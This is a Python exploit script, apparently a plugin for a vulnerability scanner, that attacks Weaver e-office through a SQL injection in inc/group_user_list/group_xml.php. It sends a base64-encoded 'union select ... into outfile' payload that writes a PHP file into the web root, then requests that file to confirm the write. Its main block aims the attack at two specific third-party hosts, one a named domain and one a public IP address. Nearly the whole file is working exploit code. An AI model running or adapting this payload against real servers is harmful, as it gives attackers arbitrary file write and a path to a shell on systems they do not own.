#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 泛微e-office getshell
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0128007
description:
    sql注入导致的getshell
    inc/group_user_list/group_xml.php
'''
import random
import base64

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):
    md5_1 = 'c4ca4238a0b923820dcc509a6f75849b'
    filename = 'wtFtw' + str(random.randint(111,999))+'.php'
    payload = '[group]:[1]|[groupid]:[1 union select 0x3c3f706870206563686f206d64352831293b203f3e,2,3,4,5,6,7,8 into outfile \'../webroot/{filename}\']'.format(filename=filename)
    payload = base64.b64encode(payload)
    #print payload
    url = arg + 'inc/group_user_list/group_xml.php?par=' + payload
    code, head, res, err, _ = curl.curl2(url)
    if code == 200:
        code, head, res, err, _ = curl.curl2(arg + filename)
        if (code==200) and (md5_1 in res):
            security_hole('weaver e-office getshell: ' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://eoffice.sccm.cn/')[1])
    audit(assign('weaver_oa', 'http://219.232.254.131:8082/')[1])